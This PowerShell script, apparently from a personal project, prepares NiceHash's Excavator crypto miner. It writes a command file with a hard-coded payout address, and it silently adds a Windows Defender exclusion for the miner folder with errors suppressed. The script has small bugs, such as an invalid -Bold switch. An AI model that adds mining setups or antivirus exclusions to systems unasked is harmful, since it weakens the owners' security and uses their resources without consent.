# [MONETIZE] Sovereign NiceHash Integration (Phase 280)
# "Selling cycles to the highest bidder. Funding the Abyss."

$ErrorActionPreference = "Continue"
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

function Log-Mine($msg) {
    Write-Host "[NICEHASH] $msg" -ForegroundColor Cyan -Bold
}

Write-Host "==========================================================" -ForegroundColor White -BackgroundColor Black
Write-Host "       NICEHASH INTEGRATION: EXCAVATOR ENGINE" -ForegroundColor White -BackgroundColor Black
Write-Host "==========================================================" -ForegroundColor White -BackgroundColor Black

$NHDir = Join-Path $PWD "data/nicehash"
if (-not (Test-Path $NHDir)) { New-Item -ItemType Directory -Path $NHDir | Out-Null }

# 1. Deployment of Excavator (Simulation of specific version download)
Log-Mine "Preparing Excavator Engine Environment..."
$ExcavatorUrl = "https://github.com/nicehash/excavator/releases/download/v1.7.7.2/excavator_v1.7.7.2_x64.zip"
$ZipPath = Join-Path $NHDir "excavator.zip"

# Log-NH "Fetching Excavator Engine..."
# Invoke-WebRequest -Uri $ExcavatorUrl -OutFile $ZipPath
# Expand-Archive -Path $ZipPath -DestinationPath $NHDir -Force

# 2. Configuration Generation
Log-Mine "Generating Mining Credentials..."
$MiningAddress = "NHbaVtw1eCvbsZiPGZ9kqWEo4zGnNQ7UdcXm" # Updated Address
$WorkerName = "ElysiaSentinel_01"

$CommandJSON = @"
[
    {"id":1,"method":"subscribe","params":["$MiningAddress.$WorkerName","x"]},
    {"id":1,"method":"algorithm.add","params":["daggerhashimoto"]}
]
"@

$CommandJSON | Out-File -FilePath (Join-Path $NHDir "cmd.json") -Encoding UTF8
Log-Mine "Command Lattice locked: cmd.json"

# 3. Defender Exception for NiceHash Sector
Log-Mine "Adding Defender Exclusion for NiceHash Sector..."
Add-MpPreference -ExclusionPath $NHDir -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "==========================================================" -ForegroundColor Black -BackgroundColor White
Write-Host " [ARMED] NICEHASH LATTICE IS ACTIVE" -ForegroundColor Black -BackgroundColor White
Write-Host " Status: EXCAVATOR_READY // ADDRESS_SET" -ForegroundColor Green
Write-Host "==========================================================" -ForegroundColor Black -BackgroundColor White
